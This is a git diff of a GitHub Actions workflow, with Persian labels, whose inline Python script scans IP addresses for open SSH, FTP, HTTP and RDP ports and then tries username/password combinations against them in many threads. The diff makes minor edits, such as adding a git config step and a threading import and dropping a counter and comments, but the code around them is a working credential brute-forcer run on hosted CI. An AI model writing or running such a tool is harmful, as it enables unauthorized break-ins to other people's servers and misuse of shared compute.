@@ -67,6 +67,11 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
+      - name: تنظیم Git
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+
       - name: نصب کتابخانه‌ها
         run: pip3 install paramiko rich requests
 
@@ -85,7 +90,7 @@ jobs:
           TIMEOUT: ${{ github.event.inputs.timeout }}
         run: |
           python3 << 'PYEOF'
-          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, re
+          import os, sys, socket, time, ipaddress, concurrent.futures, random, requests, json, re, threading
           from datetime import datetime
           from rich.console import Console
           from rich.table import Table
@@ -227,7 +232,6 @@ jobs:
           # ===== ۴. تست فوق‌سریع =====
           results_lock = threading.Lock()
           results = []
-          total_combos = 0
 
           def test_single_combo(ip, port, service, username, password):
               success = False
@@ -256,15 +260,12 @@ jobs:
                   if not is_open:
                       continue
                   service = "SSH" if port==22 else "FTP" if port==21 else "HTTP" if port in (80,443,8080) else "RDP" if port==3389 else f"port-{port}"
-                  # کش پسوردهای ناموفق برای این هدف
                   failed_passwords = set()
-                  # ساخت لیست تمام ترکیب‌ها
                   combos = []
                   for user in usernames:
                       for pwd in passwords:
                           if pwd not in failed_passwords:
                               combos.append((user, pwd))
-                  total_combos += len(combos)
 
                   with concurrent.futures.ThreadPoolExecutor(max_workers=TEST_THREADS) as executor:
                       future_to_combo = {
@@ -283,7 +284,7 @@ jobs:
                               else:
                                   with results_lock:
                                       results.append((iip, pport, ssvc, uuser, ppwd, "FAILED"))
-                                  failed_passwords.add(pwd)  # این پسورد دیگر روی این هدف آزمایش نشود
+                                  failed_passwords.add(pwd)
                           except Exception as e:
                               console.print(f"[red]✗ خطا: {e}[/red]")
 
